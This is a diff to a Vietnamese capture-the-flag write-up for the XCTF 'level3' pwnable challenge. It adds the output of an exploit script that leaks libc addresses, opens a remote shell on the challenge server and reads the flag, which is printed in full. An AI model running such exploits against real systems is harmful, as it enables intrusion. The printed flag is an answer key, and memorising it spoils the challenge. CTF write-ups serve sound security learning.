@@ -34,5 +34,23 @@ l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/5_level3 λ checksec level3
 Tiến hành viết file [exploit.py](exploit.py) và khai thác:
 
 ```
-
+l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/5_level3 λ python2 exploit.py
+[+] Opening connection to 111.200.241.244 on port 51341: Done
+('Write_got address is', '0xf76e13c0')
+('libc address is', '0xf760d000')
+('system address is', '0xf7647940')
+('/bin/sh address is', '0xf776602b')
+[*] Switching to interactive mode
+Input:
+$ ls
+bin
+dev
+flag
+level3
+lib
+lib32
+lib64
+$ cat flag
+cyberpeace{30760e28dd5d22b93e22a2d89a7113b9}
+$  
 ```
